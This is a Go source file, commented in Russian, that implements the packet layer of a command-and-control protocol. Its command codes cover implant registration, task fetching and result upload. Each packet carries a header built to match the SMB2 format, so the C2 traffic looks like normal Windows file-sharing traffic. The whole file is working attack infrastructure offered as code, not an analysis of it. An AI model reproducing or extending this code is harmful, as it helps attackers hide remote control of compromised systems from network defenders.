// Package packet реализует формат псевдо-SMB пакета, идентичный
// по структуре заголовку SMB2 (64 байта).
package packet

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
)

// Константы заголовка.
const (
	SMB2ProtocolID = "\xfeSMB"
	SMB2HeaderSize = 64
	MaxPayloadSize = 16 * 1024 * 1024
)

// Коды команд протокола C2.
const (
	CmdRegister    uint16 = 0x0000
	CmdRegisterAck uint16 = 0x0001
	CmdGetTask     uint16 = 0x0002
	CmdTaskData    uint16 = 0x0003
	CmdSendResult  uint16 = 0x0004
	CmdResultAck   uint16 = 0x0005
)

// Ошибки разбора/чтения пакета.
var (
	ErrPacketTooShort  = errors.New("packet too short")
	ErrInvalidProtocol = errors.New("invalid protocol id")
	ErrPayloadTooLarge = errors.New("payload too large")
	ErrIncomplete      = errors.New("incomplete payload")
)

// Packet — псевдо-SMB пакет.
type Packet struct {
	Command   uint16
	Status    uint32
	SessionID uint64
	MessageID uint64
	TreeID    uint32
	Payload   []byte
}

// New создаёт новый пакет с заданным кодом команды и payload.
func New(command uint16, messageID uint64, payload []byte) *Packet {
	return &Packet{
		Command:   command,
		MessageID: messageID,
		Payload:   payload,
	}
}

// Serialize собирает пакет в байтовый срез по структуре SMB2 Header.
// Все вызовы binary.Write игнорируют возвращаемую ошибку, так как
// bytes.Buffer никогда её не возвращает: буфер растёт динамически и
// не имеет фиксированного размера.
func (p *Packet) Serialize() []byte {
	buf := new(bytes.Buffer)
	buf.WriteString(SMB2ProtocolID)
	// bytes.Buffer никогда не возвращает ошибку при записи
	_ = binary.Write(buf, binary.LittleEndian, uint16(SMB2HeaderSize))
	_ = binary.Write(buf, binary.LittleEndian, uint16(0))
	_ = binary.Write(buf, binary.LittleEndian, p.Status)
	_ = binary.Write(buf, binary.LittleEndian, p.Command)
	_ = binary.Write(buf, binary.LittleEndian, uint16(0))
	_ = binary.Write(buf, binary.LittleEndian, uint32(0))
	_ = binary.Write(buf, binary.LittleEndian, uint32(0))
	_ = binary.Write(buf, binary.LittleEndian, p.MessageID)
	_ = binary.Write(buf, binary.LittleEndian, uint32(len(p.Payload)))
	_ = binary.Write(buf, binary.LittleEndian, p.TreeID)
	_ = binary.Write(buf, binary.LittleEndian, p.SessionID)
	buf.Write(make([]byte, 16))
	buf.Write(p.Payload)
	return buf.Bytes()
}

// Deserialize разбирает байтовый срез в Packet.
func Deserialize(data []byte) (*Packet, error) {
	if len(data) < SMB2HeaderSize {
		return nil, ErrPacketTooShort
	}
	if string(data[0:4]) != SMB2ProtocolID {
		return nil, ErrInvalidProtocol
	}
	p := &Packet{
		Status:    binary.LittleEndian.Uint32(data[8:12]),
		Command:   binary.LittleEndian.Uint16(data[12:14]),
		MessageID: binary.LittleEndian.Uint64(data[24:32]),
		TreeID:    binary.LittleEndian.Uint32(data[36:40]),
		SessionID: binary.LittleEndian.Uint64(data[40:48]),
	}
	payloadLen := binary.LittleEndian.Uint32(data[32:36])
	if payloadLen > MaxPayloadSize {
		return nil, ErrPayloadTooLarge
	}
	if uint32(len(data)-SMB2HeaderSize) < payloadLen {
		return nil, ErrIncomplete
	}
	p.Payload = data[SMB2HeaderSize : SMB2HeaderSize+payloadLen]
	return p, nil
}

// Read читает один полный пакет из TCP-соединения.
// Сначала читает заголовок, извлекает длину payload и дочитывает его
// через io.ReadFull, что гарантирует корректную работу с длинными выводами.
func Read(conn net.Conn) (*Packet, error) {
	header := make([]byte, SMB2HeaderSize)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, fmt.Errorf("read header: %w", err)
	}
	payloadLen := binary.LittleEndian.Uint32(header[32:36])
	if payloadLen > MaxPayloadSize {
		return nil, ErrPayloadTooLarge
	}
	full := make([]byte, SMB2HeaderSize+payloadLen)
	copy(full, header)
	if payloadLen > 0 {
		if _, err := io.ReadFull(conn, full[SMB2HeaderSize:]); err != nil {
			return nil, fmt.Errorf("read payload: %w", err)
		}
	}
	return Deserialize(full)
}

// Write сериализует и отправляет пакет.
func Write(conn net.Conn, p *Packet) error {
	if _, err := conn.Write(p.Serialize()); err != nil {
		return fmt.Errorf("write packet: %w", err)
	}
	return nil
}